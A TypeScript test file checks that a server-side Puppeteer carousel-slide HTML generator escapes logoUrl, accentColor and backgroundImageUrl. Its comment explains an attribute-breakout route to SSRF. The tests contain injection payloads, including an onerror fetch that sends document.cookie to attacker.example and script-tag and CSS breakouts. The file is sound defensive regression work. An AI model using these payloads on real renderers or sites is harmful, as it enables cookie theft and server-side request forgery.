import { describe, it, expect } from "vitest";
import { generateCarouselSlideHtml, type CarouselOptions, type CarouselSlide } from "../tools/carousel-template";

/**
 * `generateCarouselSlideHtml` interpolated `logoUrl`, `accentColor` and
 * `backgroundImageUrl` into the Puppeteer-rendered HTML with NO escaping and
 * NO character-class validation — unlike `creative-templates.ts` /
 * `card-engine.ts`, which gate every brandColor/image-URL interpolation
 * through `safeColor` / `safeImageUrl` for exactly this reason (security
 * audit 2026-09-28).
 *
 * `logoUrl` reaches here from `repurposeFromUrl`'s free-form client input
 * (`z.string()`, no `.url()`) via `resolveLogoForOrg`, whose SSRF gate
 * (`isPublicImageUrl`) only checks the parsed HOSTNAME is public — it does
 * NOT strip HTML-breakout characters, and `new URL()` happily parses
 * `https://evil.example/a.png" onerror="..."` with hostname `evil.example`
 * while returning that ORIGINAL raw string unmodified. So a value that
 * passes the SSRF check can still break out of `<img src="...">` and inject
 * an execution vector into the Chromium page this codebase renders
 * server-side — a page with real network egress. This is not a normal XSS
 * against an end user's browser; it's a route to server-side SSRF from a
 * headless render.
 */

const base: CarouselOptions = {
  slides: [{ type: "cover", title: "T", body: "B" }],
  channelName: "Acme",
  handle: "@acme",
};

const slide: CarouselSlide = { type: "cover", title: "T", body: "B" };

describe("generateCarouselSlideHtml — logoUrl attribute-breakout", () => {
  it("never lets logoUrl break out of the src attribute", () => {
    const malicious = `https://evil.example/a.png" onerror="fetch('https://attacker.example/exfil?d='+document.cookie)`;
    const html = generateCarouselSlideHtml(slide, { ...base, logoUrl: malicious }, 1);
    expect(html).not.toContain('onerror="fetch');
    expect(html).not.toContain(malicious);
  });

  it("also sanitizes the footer's duplicate logo <img>", () => {
    const malicious = `https://evil.example/a.png"><script>alert(1)</script>`;
    const html = generateCarouselSlideHtml(slide, { ...base, logoUrl: malicious }, 1);
    expect(html).not.toContain("<script>alert(1)</script>");
  });

  it("still renders a real https logo normally", () => {
    const html = generateCarouselSlideHtml(slide, { ...base, logoUrl: "https://cdn.example.com/logo.png" }, 1);
    expect(html).toContain('src="https://cdn.example.com/logo.png"');
  });
});

describe("generateCarouselSlideHtml — accentColor CSS-breakout", () => {
  it("falls back to a safe default when accentColor is not a hex color", () => {
    const malicious = `red;}</style><script>alert(1)</script><style>`;
    const html = generateCarouselSlideHtml(slide, { ...base, accentColor: malicious }, 1);
    expect(html).not.toContain("<script>alert(1)</script>");
  });

  it("keeps a real hex accent color", () => {
    const html = generateCarouselSlideHtml(slide, { ...base, accentColor: "#ff7a00" }, 1);
    expect(html).toContain("#ff7a00");
  });
});

describe("generateCarouselSlideHtml — backgroundImageUrl CSS url() breakout", () => {
  it("drops an unsafe backgroundImageUrl rather than interpolating it raw", () => {
    const malicious = `x'); } body { background: red; } /*`;
    const html = generateCarouselSlideHtml(slide, { ...base, backgroundImageUrl: malicious }, 1);
    expect(html).not.toContain(malicious);
  });

  it("keeps a real https backgroundImageUrl", () => {
    const html = generateCarouselSlideHtml(slide, { ...base, backgroundImageUrl: "https://cdn.example.com/bg.jpg" }, 1);
    expect(html).toContain("https://cdn.example.com/bg.jpg");
  });
});
